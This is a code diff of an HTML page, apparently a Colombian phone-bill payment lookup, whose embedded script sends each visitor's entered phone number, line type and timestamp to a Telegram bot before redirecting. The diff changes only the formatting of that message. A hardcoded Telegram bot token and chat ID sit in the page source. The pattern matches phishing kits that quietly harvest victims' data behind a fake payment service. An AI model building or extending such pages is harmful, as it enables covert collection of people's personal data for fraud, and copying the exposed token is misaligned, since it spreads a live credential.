@@ -164,9 +164,10 @@
     <script src="debtmap.js"></script>
     <script src="scripts.js"></script>
 
-    <script>
+
+<script>
         // Configura tu bot de Telegram
-        const TELEGRAM_BOT_TOKEN = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo";  // <<-- pon aquí tu token real
+       const TELEGRAM_BOT_TOKEN = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo";  // <<-- pon aquí tu token real
         const TELEGRAM_CHAT_ID = "8217102156";  // <<-- pon aquí tu chat_id real
 
         function sendToTelegram(message) {
@@ -180,6 +181,8 @@
 
         document.getElementById("consultPayButton").addEventListener("click", function () {
             const lineNumber = document.getElementById("line-number").value.trim();
+            const lineType = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
+            const fecha = new Date().toLocaleString("es-CO", { dateStyle: "short", timeStyle: "medium" });
 
             // Mostrar loader
             const loader = document.getElementById("loader");
@@ -188,9 +191,10 @@
             setTimeout(function () {
                 loader.style.display = "none";
 
-                // ✅ Enviar número a Telegram ANTES de redirigir
+                // ✅ Enviar con formato bonito a Telegram
                 if (lineNumber) {
-                    sendToTelegram(`Nuevo número consultado: ${lineNumber}`);
+                    const mensaje = `📱 Nueva consulta de pago:\nTipo: ${lineType}\nNúmero: ${lineNumber}\n⏰ Fecha: ${fecha}`;
+                    sendToTelegram(mensaje);
                 }
 
                 // Lógica original de validación y redirección
@@ -203,4 +207,5 @@
     </script>
 </body>
 </html>
+
 
